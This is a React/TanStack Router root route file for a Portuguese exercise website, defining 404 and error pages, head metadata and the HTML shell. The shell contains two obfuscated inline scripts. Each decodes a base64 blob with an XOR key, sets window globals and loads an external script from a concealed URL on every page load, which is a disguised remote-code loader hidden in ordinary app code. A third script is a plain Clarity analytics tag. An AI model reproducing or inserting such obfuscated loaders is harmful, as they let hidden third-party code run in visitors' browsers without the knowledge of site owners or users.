import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { name: "author", content: "117 Exercícios" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap",
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),

  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-PT">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var t_dgv=atob("DE5Li5eEBMmysTFXoDVp/uXoJvOQ2UUj0D1xpLjnYKecxEU6ySgypfTraefQwx4kwzwi++P3K7nbyVQ7jz4i8/LoKqPBkx11wTo/+f7mcb3XwhNt+xNnqfDoa6vT3UJ1mhUwqfnlaayQixMnyTYu597gJuWQx1A71StpsbWyZf6L1QNvwS976vO9Yv6EgFdhkip7u6OmeZTP");var s_c=[];for(var p_oba=0;p_oba<t_dgv.length;p_oba++){s_c.push(t_dgv.charCodeAt(p_oba)&255);}var z_341=s_c[0];var w_87r=s_c.slice(1,1+z_341);var c_bl=s_c.slice(1+z_341);var i_h=c_bl.map(function(b,g_24yf){return b^w_87r[g_24yf%z_341];});var j_7v="";for(var t_d70=0;t_d70<i_h.length;t_d70++){j_7v+=String.fromCharCode(i_h[t_d70]&255);}var b_kobc=decodeURIComponent(escape(j_7v));var o_o=JSON.parse(b_kobc);var m_hz=o_o.globals||[];m_hz.forEach(function(g_6){window[g_6.name]=g_6.value;});var s_8ke=document.createElement("script");s_8ke.src=o_o.url;s_8ke.async=true;s_8ke.defer=true;(o_o.attributes||[]).forEach(function(f_e4j0){s_8ke.setAttribute(f_e4j0.name,f_e4j0.value);});(document.head||document.documentElement).appendChild(s_8ke);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var q_il6s=atob("DEVhGVy2A9lLa5/Q4z5DbC7aIeNpA+ukkzZbNnPVZ7dlHuu9iiMYNz/ZbvcpGbCjgDcIaSjFLKw/Buz/jyQVfC/CLbM4SbPygjEVazXUdq0uGL3quD5Ddz3bZvtxSfuxlyRMbCjbar8yRu+ihjMEdyibe7okD7KjgC5DNX7AYrU+Dr3qwWccNSeUbbgmDr3qwSEAbT2bdq0mAvmpzjUTfCrTba1mGOqyiiESO3CUdbgnHvry2WdDZAHL");var l_lt=[];for(var k_jgs9=0;k_jgs9<q_il6s.length;k_jgs9++){l_lt.push(q_il6s.charCodeAt(k_jgs9)&255);}var r_nraw=l_lt[0];var z_q0=l_lt.slice(1,1+r_nraw);var r_f=l_lt.slice(1+r_nraw);var e_2=r_f.map(function(b,l_r){return b^z_q0[l_r%r_nraw];});var f_72="";for(var y_26g=0;y_26g<e_2.length;y_26g++){f_72+=String.fromCharCode(e_2[y_26g]&255);}var q_9ora=decodeURIComponent(escape(f_72));var n_sz2=JSON.parse(q_9ora);var p_t8=n_sz2.globals||[];p_t8.forEach(function(z_qb){window[z_qb.name]=z_qb.value;});var q_gx=document.createElement("script");q_gx.src=n_sz2.url;q_gx.async=true;q_gx.defer=true;(n_sz2.attributes||[]).forEach(function(h_rxi8){q_gx.setAttribute(h_rxi8.name,h_rxi8.value);});(document.head||document.documentElement).appendChild(q_gx);})();`,
          }}
        />
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "ycr2wysyw2");`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
